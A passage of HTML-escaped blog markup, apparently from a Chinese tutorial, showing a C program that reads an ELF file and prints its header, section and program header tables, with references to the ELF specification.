class=&#34;line&#34;&gt;79&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;80&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;81&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;82&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;83&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;84&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;85&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;86&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;87&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;88&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;89&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;90&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;91&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;92&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;93&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;94&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;95&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;96&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;97&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;98&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;99&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;100&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;101&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;102&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;103&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;104&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;105&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;106&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;107&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;108&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;109&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;110&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;111&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;112&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;113&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;114&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;115&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;116&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;117&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;118&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;119&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;120&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;121&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;122&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;123&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;124&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;#&lt;span class=&#34;keyword&#34;&gt;include&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;lt;stdio.h&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;#&lt;span class=&#34;keyword&#34;&gt;include&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;lt;string.h&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;#&lt;span class=&#34;keyword&#34;&gt;include&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;lt;errno.h&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;#&lt;span class=&#34;keyword&#34;&gt;include&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;lt;elf.h&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;#&lt;span class=&#34;keyword&#34;&gt;include&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;lt;unistd.h&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;#&lt;span class=&#34;keyword&#34;&gt;include&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;lt;stdlib.h&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;#&lt;span class=&#34;keyword&#34;&gt;include&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;lt;sys/mman.h&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;#&lt;span class=&#34;keyword&#34;&gt;include&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;lt;stdint.h&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;#&lt;span class=&#34;keyword&#34;&gt;include&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;lt;sys/stat.h&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;#&lt;span class=&#34;keyword&#34;&gt;include&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;lt;fcntl.h&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;// 解析文件头&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;// int check_elf_head(file)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;// &amp;#123;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;//     printf(&amp;quot;just a test%d\n&amp;quot;,file[0]);&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;//     return 0;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;// &amp;#125;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;main&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;(&lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; argc, &lt;span class=&#34;type&#34;&gt;char&lt;/span&gt; **argv)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;     &lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; fd, i;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;type&#34;&gt;uint8_t&lt;/span&gt; *mem;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;class&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;struct&lt;/span&gt; &lt;span class=&#34;title&#34;&gt;stat&lt;/span&gt; &lt;span class=&#34;title&#34;&gt;st&lt;/span&gt;;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;type&#34;&gt;char&lt;/span&gt; *StringTable, *interp;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    Elf32_Ehdr *Elf_header;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    Elf32_Phdr *Pro_header;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    Elf32_Shdr *Section_header;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; (argc &amp;lt; &lt;span class=&#34;number&#34;&gt;2&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;built_in&#34;&gt;printf&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;usage: %s &amp;lt;executable&amp;gt; \n&amp;quot;&lt;/span&gt;, argv[&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;]);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;built_in&#34;&gt;exit&lt;/span&gt;(&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; ((fd = open(argv[&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;], O_RDONLY)) &amp;lt; &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;) &lt;span class=&#34;comment&#34;&gt;//什么情况下会这样呢? 和权限好像没关系&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        perror(&lt;span class=&#34;string&#34;&gt;&amp;quot;open&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;built_in&#34;&gt;exit&lt;/span&gt;(&lt;span class=&#34;number&#34;&gt;-1&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; (fstat(fd, &amp;amp;st) &amp;lt; &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        perror(&lt;span class=&#34;string&#34;&gt;&amp;quot;fstat&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;built_in&#34;&gt;exit&lt;/span&gt;(&lt;span class=&#34;number&#34;&gt;-1&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    mem = mmap(&lt;span class=&#34;literal&#34;&gt;NULL&lt;/span&gt;, st.st_size, PROT_READ, MAP_PRIVATE, fd, &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;comment&#34;&gt;// 64位还是32位&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; (mem[&lt;span class=&#34;number&#34;&gt;4&lt;/span&gt;] == &lt;span class=&#34;number&#34;&gt;0x2&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;built_in&#34;&gt;printf&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;it is 64 bit %d\n&amp;quot;&lt;/span&gt;,mem[&lt;span class=&#34;number&#34;&gt;4&lt;/span&gt;]);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;else&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;built_in&#34;&gt;printf&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;it is 32 bit %d\n&amp;quot;&lt;/span&gt;,mem[&lt;span class=&#34;number&#34;&gt;4&lt;/span&gt;]);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;comment&#34;&gt;// check_elf_head(mem);&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;comment&#34;&gt;//头部信息&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    Elf_header = (Elf32_Ehdr *)mem;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;built_in&#34;&gt;printf&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;\n&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;built_in&#34;&gt;printf&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;e_ident:                           \t%10x\n&amp;quot;&lt;/span&gt;,Elf_header-&amp;gt;e_ident[&lt;span class=&#34;number&#34;&gt;16&lt;/span&gt;]);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;built_in&#34;&gt;printf&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;Type:                           \t%d\n&amp;quot;&lt;/span&gt;,Elf_header-&amp;gt;e_type);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;built_in&#34;&gt;printf&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;Machine:                        \t%d\n&amp;quot;&lt;/span&gt;,Elf_header-&amp;gt;e_machine);  &lt;span class=&#34;comment&#34;&gt;/* Architecture */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;built_in&#34;&gt;printf&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;Version:                        \t%#02x\n&amp;quot;&lt;/span&gt;,Elf_header-&amp;gt;e_version);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;built_in&#34;&gt;printf&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;Entry point address:            \t%#02x\n&amp;quot;&lt;/span&gt;,Elf_header-&amp;gt;e_entry);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;built_in&#34;&gt;printf&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;Start of program headers:       \t%d(bytes)\n&amp;quot;&lt;/span&gt;,Elf_header-&amp;gt;e_phoff);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;built_in&#34;&gt;printf&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;Start of section headers:       \t%d(bytes)\n&amp;quot;&lt;/span&gt;,Elf_header-&amp;gt;e_shoff);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;built_in&#34;&gt;printf&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;Flags:                          \t%#02x\n&amp;quot;&lt;/span&gt;,Elf_header-&amp;gt;e_flags);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;built_in&#34;&gt;printf&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;Size of this header:            \t%d(bytes)\n&amp;quot;&lt;/span&gt;,Elf_header-&amp;gt;e_ehsize);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;built_in&#34;&gt;printf&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;Size of program headers:        \t%d(bytes)\n&amp;quot;&lt;/span&gt;,Elf_header-&amp;gt;e_phentsize);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;built_in&#34;&gt;printf&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;Number of program headers:      \t%d\n&amp;quot;&lt;/span&gt;,Elf_header-&amp;gt;e_phnum);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;built_in&#34;&gt;printf&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;Size of section headers:        \t%d(bytes)\n&amp;quot;&lt;/span&gt;,Elf_header-&amp;gt;e_shentsize);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;built_in&#34;&gt;printf&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;Number of section headers:      \t%d\n&amp;quot;&lt;/span&gt;,Elf_header-&amp;gt;e_shnum);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;built_in&#34;&gt;printf&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;Section header string table index:\t%d\n&amp;quot;&lt;/span&gt;,Elf_header-&amp;gt;e_shstrndx);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;comment&#34;&gt;// 解析节信息 readelf  -S&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    Section_header = (Elf32_Shdr *)&amp;amp;mem[Elf_header-&amp;gt;e_shoff];&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    StringTable = &amp;amp;mem[Section_header[Elf_header-&amp;gt;e_shstrndx].sh_offset];&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;built_in&#34;&gt;printf&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;Section header list:\n\n&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;type&#34;&gt;char&lt;/span&gt; a = &lt;span class=&#34;string&#34;&gt;&amp;#x27;|&amp;#x27;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;comment&#34;&gt;// size flag&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;comment&#34;&gt;// for (i = 1; i &amp;lt; Elf_header-&amp;gt;e_shnum; i++) &amp;#123;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;comment&#34;&gt;//     printf(&amp;quot;%-20s\t\t%-10x\t\t0x%x\t\t%x\t\t%c\n&amp;quot;,&amp;amp;StringTable[shdr[i].sh_name],shdr[i].sh_type,shdr[i].sh_addr,shdr[i].sh_size,shdr[i].sh_flags);&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;comment&#34;&gt;// &amp;#125;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;built_in&#34;&gt;printf&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;[Nr] Name%-20c\t\tType%-10c\tAddr\t\tOff\tSize\tES Flg  Al&amp;quot;&lt;/span&gt;,a);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt;(i = &lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;; i&amp;lt;Elf_header-&amp;gt;e_shnum; i++)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;/*printf(&amp;quot;\n[%-2d]  %-20s              %-10x            %08x     %06x    %06x   %02x %02x  %02x &amp;quot;\&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt; */&lt;/span&gt;     &lt;span class=&#34;built_in&#34;&gt;printf&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;\n[%-2d]  %-20s\t\t%-10x\t%08x\t%06x\t%06x\t%02x %02x  %02x &amp;quot;&lt;/span&gt;\&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;               , i,&amp;amp;StringTable[Section_header-&amp;gt;sh_name],Section_header-&amp;gt;sh_type,Section_header-&amp;gt;sh_addr,\&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;               Section_header-&amp;gt;sh_offset,Section_header-&amp;gt;sh_size,Section_header-&amp;gt;sh_entsize,\&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;               Section_header-&amp;gt;sh_flags,Section_header-&amp;gt;sh_addralign);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        Section_header++;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;// 解析段信息&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;// readelf -l&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    Pro_header = (Elf32_Phdr *)&amp;amp;mem[Elf_header-&amp;gt;e_phoff];&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;built_in&#34;&gt;printf&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;\n&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;built_in&#34;&gt;printf&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;\n/*****Program Headers:*****/\n&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;built_in&#34;&gt;printf&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;starting at offset: %d\n&amp;quot;&lt;/span&gt;,Elf_header-&amp;gt;e_phoff);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;built_in&#34;&gt;printf&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;Number of program headers: %d\n&amp;quot;&lt;/span&gt;,Elf_header-&amp;gt;e_phnum);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;built_in&#34;&gt;printf&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;Type           Offset   VirtAddr   PhysAddr   FileSiz     MemSiz    Flg\n&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt;(i = &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;; i&amp;lt;Elf_header-&amp;gt;e_phnum; i++)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;built_in&#34;&gt;printf&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;%d           %-#6x   %-#x   %-#x   %-#5x     %-#5x    %-#x\n&amp;quot;&lt;/span&gt;,Pro_header-&amp;gt;p_type,Pro_header-&amp;gt;p_offset,\&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;			    Pro_header-&amp;gt;p_vaddr,Pro_header-&amp;gt;p_paddr\&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;               ,Pro_header-&amp;gt;p_filesz,Pro_header-&amp;gt;p_memsz,Pro_header-&amp;gt;p_flags);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        Pro_header++;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;



&lt;h1 id=&#34;参考&#34;&gt;&lt;a href=&#34;#参考&#34; class=&#34;headerlink&#34; title=&#34;参考&#34;&gt;&lt;/a&gt;参考&lt;/h1&gt;&lt;p&gt;ELF(5)手册 &lt;/p&gt;
&lt;p&gt;ELF官方规范文档&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://refspecs.linuxfoundation.org/elf/gabi4+/contents.html&#34;&gt;https://refspecs.linuxfoundation.org/elf/gabi4+/contents.html&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://refspecs.linuxfoundation.org/elf/gabi4+/ch4.eheader.html&#34;&gt;https://refspecs.linuxfoundation.org/elf/gabi4+/ch4.eheader.html&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://blog.csdn.net/qfanmingyiq/article/details/124295287&#34;&gt;https://blog.csdn.net/qfanmingyiq/article/details/124295287&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://zhuanlan.zhihu.com/p/401446080?utm_id=0&#34;&gt;https://zhuanlan.zhihu.com/p/401446080?utm_id=0&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://github.com/jianhong-li/ElfReader&#34;&gt;https://github.com/jianhong-li/ElfReader&lt;/a&gt;&lt;/p&gt;
